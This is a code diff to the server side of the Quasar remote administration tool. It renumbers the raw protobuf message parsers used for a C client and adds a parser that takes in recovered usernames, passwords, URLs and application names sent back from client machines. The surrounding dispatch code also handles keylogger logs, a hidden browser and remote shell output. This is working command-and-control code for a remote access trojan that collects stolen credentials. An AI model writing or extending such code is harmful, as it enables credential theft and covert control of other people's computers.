@@ -209,13 +209,13 @@ namespace Quasar.Server.Networking
             return true;
         }
 
-        /* Fallback: C client GetDrivesResponse = 08 2F [repeated 0A len Drive]. Each Drive = 0A len display 12 len root. */
+        /* Fallback: C client GetDrivesResponse = 08 30 [repeated 0A len Drive]. Each Drive = 0A len display 12 len root. */
         private static bool TryParseRawGetDrivesResponse(byte[] payload, int start, int length, out GetDrivesResponse result)
         {
             result = null;
             int end = start + length;
             if (!TryReadIMessagePrefix(payload, start, end, out int subtype, out int offset)) return false;
-            if (subtype != 47) return false;
+            if (subtype != 48) return false;
             var drives = new List<Drive>();
             while (offset + 2 <= end && payload[offset] == 0x0A)
             {
@@ -244,13 +244,13 @@ namespace Quasar.Server.Networking
             return true;
         }
 
-        /* Fallback: C client GetConnectionsResponse (subtype 37) = 08 25 [repeated 0A len TcpConnection]. Each TcpConnection: 0x0A ProcessName, 0x12 LocalAddress, 0x18 LocalPort, 0x22 RemoteAddress, 0x28 RemotePort, 0x30 State. */
+        /* Fallback: C client GetConnectionsResponse (subtype 38) = 08 26 [repeated 0A len TcpConnection]. Each TcpConnection: 0x0A ProcessName, 0x12 LocalAddress, 0x18 LocalPort, 0x22 RemoteAddress, 0x28 RemotePort, 0x30 State. */
         private static bool TryParseRawGetConnectionsResponse(byte[] payload, int start, int length, out GetConnectionsResponse result)
         {
             result = null;
             int end = start + length;
             if (!TryReadIMessagePrefix(payload, start, end, out int subtype, out int offset)) return false;
-            if (subtype != 37) return false;
+            if (subtype != 38) return false;
             var connections = new List<TcpConnection>();
             while (offset + 2 <= end && payload[offset] == 0x0A)
             {
@@ -289,13 +289,13 @@ namespace Quasar.Server.Networking
             return true;
         }
 
-        /* Fallback: C client GetSystemInfoResponse = 08 3E [repeated 0A len Tuple]. Each Tuple = 0A len item1 12 len item2. */
+        /* Fallback: C client GetSystemInfoResponse = 08 3F (subtype 63) [repeated 0A len Tuple]. Each Tuple = 0A len item1 12 len item2. */
         private static bool TryParseRawGetSystemInfoResponse(byte[] payload, int start, int length, out GetSystemInfoResponse result)
         {
             result = null;
             int end = start + length;
             if (!TryReadIMessagePrefix(payload, start, end, out int subtype, out int offset)) return false;
-            if (subtype != 62) return false;
+            if (subtype != 63) return false;
             var list = new List<Tuple<string, string>>();
             while (offset + 2 <= end && payload[offset] == 0x0A)
             {
@@ -416,13 +416,13 @@ namespace Quasar.Server.Networking
             return true;
         }
 
-        /* Fallback: C client GetProcessesResponse = 08 37 (subtype 55) + field 1 repeated Process (0x0A len msg). Each Process: 0x0A Name, 0x10 Id, 0x1A MainWindowTitle. */
+        /* Fallback: C client GetProcessesResponse = 08 38 (subtype 56) + field 1 repeated Process (0x0A len msg). Each Process: 0x0A Name, 0x10 Id, 0x1A MainWindowTitle. */
         private static bool TryParseRawGetProcessesResponse(byte[] payload, int start, int length, out GetProcessesResponse result)
         {
             result = null;
             int end = start + length;
             if (!TryReadIMessagePrefix(payload, start, end, out int subtype, out int offset)) return false;
-            if (subtype != 55) return false;
+            if (subtype != 56) return false;
             var processes = new List<Common.Models.Process>();
             while (offset + 2 <= end && payload[offset] == 0x0A)
             {
@@ -458,13 +458,13 @@ namespace Quasar.Server.Networking
             return true;
         }
 
-        /* Fallback: C client GetStartupItemsResponse = 08 3C (subtype 60) + field 1 repeated StartupItem (0x0A len msg). Each StartupItem: 0x0A Name, 0x12 Path, 0x18 Type. */
+        /* Fallback: C client GetStartupItemsResponse = 08 3D (subtype 61) + field 1 repeated StartupItem (0x0A len msg). Each StartupItem: 0x0A Name, 0x12 Path, 0x18 Type. */
         private static bool TryParseRawGetStartupItemsResponse(byte[] payload, int start, int length, out GetStartupItemsResponse result)
         {
             result = null;
             int end = start + length;
             if (!TryReadIMessagePrefix(payload, start, end, out int subtype, out int offset)) return false;
-            if (subtype != 60) return false;
+            if (subtype != 61) return false;
             var items = new List<StartupItem>();
             while (offset + 2 <= end && payload[offset] == 0x0A)
             {
@@ -570,13 +570,13 @@ namespace Quasar.Server.Networking
             return true;
         }
 
-        /* Fallback: C client FileTransferChunk (subtype 33) = 08 21 + field 1 Id (varint), 2 FilePath (string), 3 FileSize (varint64), 4 Chunk (len: Offset varint, Data bytes). */
+        /* Fallback: C client FileTransferChunk (subtype 34) = 08 22 + field 1 Id (varint), 2 FilePath (string), 3 FileSize (varint64), 4 Chunk (len: Offset varint, Data bytes). */
         private static bool TryParseRawFileTransferChunk(byte[] payload, int start, int length, out FileTransferChunk result)
         {
             result = null;
             int end = start + length;
             if (!TryReadIMessagePrefix(payload, start, end, out int subtype, out int offset)) return false;
-            if (subtype != 33) return false;
+            if (subtype != 34) return false;
             int id = 0;
             string filePath = null;
             long fileSize = 0;
@@ -630,13 +630,13 @@ namespace Quasar.Server.Networking
             return true;
         }
 
-        /* Fallback: C client FileTransferComplete (subtype 34) = 08 22 + field 1 Id (varint), 2 FilePath (string). */
+        /* Fallback: C client FileTransferComplete (subtype 35) = 08 23 + field 1 Id (varint), 2 FilePath (string). */
         private static bool TryParseRawFileTransferComplete(byte[] payload, int start, int length, out FileTransferComplete result)
         {
             result = null;
             int end = start + length;
             if (!TryReadIMessagePrefix(payload, start, end, out int subtype, out int offset)) return false;
-            if (subtype != 34) return false;
+            if (subtype != 35) return false;
             int id = 0;
             string filePath = null;
             while (offset < end)
@@ -655,13 +655,13 @@ namespace Quasar.Server.Networking
             return true;
         }
 
-        /* Fallback: C client DoShellExecuteResponse (subtype 24) = 08 18 + field 1 Output (string), 2 IsError (varint). */
+        /* Fallback: C client DoShellExecuteResponse (subtype 25) = 08 19 + field 1 Output (string), 2 IsError (varint). */
         private static bool TryParseRawDoShellExecuteResponse(byte[] payload, int start, int length, out DoShellExecuteResponse result)
         {
             result = null;
             int end = start + length;
             if (!TryReadIMessagePrefix(payload, start, end, out int subtype, out int offset)) return false;
-            if (subtype != 24) return false;
+            if (subtype != 25) return false;
             string output = "";
             bool isError = false;
             while (offset < end)
@@ -681,6 +681,40 @@ namespace Quasar.Server.Networking
                 offset += len;
             }
             result = new DoShellExecuteResponse { Output = output ?? "", IsError = isError };
+            return true;
+        }
+
+        /* Fallback: C client GetPasswordsResponse (subtype 54) = 08 36 + field 1 repeated RecoveredAccount (0x0A len). Each: 0x0A Username, 0x12 Password, 0x1A Url, 0x22 Application. */
+        private static bool TryParseRawGetPasswordsResponse(byte[] payload, int start, int length, out GetPasswordsResponse result)
+        {
+            result = null;
+            int end = start + length;
+            if (!TryReadIMessagePrefix(payload, start, end, out int subtype, out int offset)) return false;
+            if (subtype != 54) return false;
+            var accounts = new List<RecoveredAccount>();
+            while (offset + 2 <= end && payload[offset] == 0x0A)
+            {
+                offset++;
+                if (!TryReadVarint(payload, ref offset, end, out int msgLen) || offset + msgLen > end) break;
+                int msgEnd = offset + msgLen;
+                string username = "", password = "", url = "", application = "";
+                while (offset < msgEnd)
+                {
+                    if (!TryReadVarint(payload, ref offset, msgEnd, out int tag)) break;
+                    int field = tag >> 3;
+                    if ((tag & 7) != 2) break;
+                    if (!TryReadVarint(payload, ref offset, msgEnd, out int len) || offset + len > msgEnd) break;
+                    string s = Encoding.UTF8.GetString(payload, offset, len);
+                    offset += len;
+                    if (field == 1) username = s;
+                    else if (field == 2) password = s;
+                    else if (field == 3) url = s;
+                    else if (field == 4) application = s;
+                }
+                accounts.Add(new RecoveredAccount { Username = username, Password = password, Url = url, Application = application });
+                offset = msgEnd;
+            }
+            result = new GetPasswordsResponse { RecoveredAccounts = accounts };
             return true;
         }
 
@@ -761,6 +795,36 @@ namespace Quasar.Server.Networking
                 offset += len;
             }
             result = new CloseHiddenBrowserResult { Result = res, Message = message ?? "" };
+            return true;
+        }
+
+        /* Fallback: C client SetStatusFileManager (subtype 65) = 08 41 + field 1 Message (0x0A string), field 2 SetLastDirectorySeen (0x10 varint). */
+        private static bool TryParseRawSetStatusFileManager(byte[] payload, int start, int length, out SetStatusFileManager result)
+        {
+            result = null;
+            int end = start + length;
+            if (!TryReadIMessagePrefix(payload, start, end, out int subtype, out int offset)) return false;
+            if (subtype != 65) return false;
+            string msg = null;
+            bool setLast = false;
+            while (offset < end)
+            {
+                if (!TryReadVarint(payload, ref offset, end, out int tag)) break;
+                int field = tag >> 3;
+                int wire = tag & 7;
+                if (wire == 0)
+                {
+                    if (!TryReadVarint(payload, ref offset, end, out int v)) break;
+                    if (field == 2) setLast = (v != 0);
+                    continue;
+                }
+                if (wire != 2) break;
+                if (!TryReadVarint(payload, ref offset, end, out int len) || offset + len > end) break;
+                if (field == 1) msg = Encoding.UTF8.GetString(payload, offset, len);
+                offset += len;
+            }
+            if (msg == null) return false;
+            result = new SetStatusFileManager { Message = msg, SetLastDirectorySeen = setLast };
             return true;
         }
 
@@ -1168,6 +1232,10 @@ namespace Quasar.Server.Networking
                                         {
                                             message = rawShellResp;
                                         }
+                                        else if (TryParseRawGetPasswordsResponse(_payloadBuffer, payloadStart, _payloadLen, out var rawPasswords))
+                                        {
+                                            message = rawPasswords;
+                                        }
                                         else if (TryParseRawGetKeyloggerLogsDirectoryResponse(_payloadBuffer, payloadStart, _payloadLen, out var rawKeyloggerLogs))
                                         {
                                             message = rawKeyloggerLogs;
@@ -1179,6 +1247,10 @@ namespace Quasar.Server.Networking
                                         else if (TryParseRawCloseHiddenBrowserResult(_payloadBuffer, payloadStart, _payloadLen, out var rawCloseGhost))
                                         {
                                             message = rawCloseGhost;
+                                        }
+                                        else if (TryParseRawSetStatusFileManager(_payloadBuffer, payloadStart, _payloadLen, out var rawStatus))
+                                        {
+                                            message = rawStatus;
                                         }
                                         else
                                         {
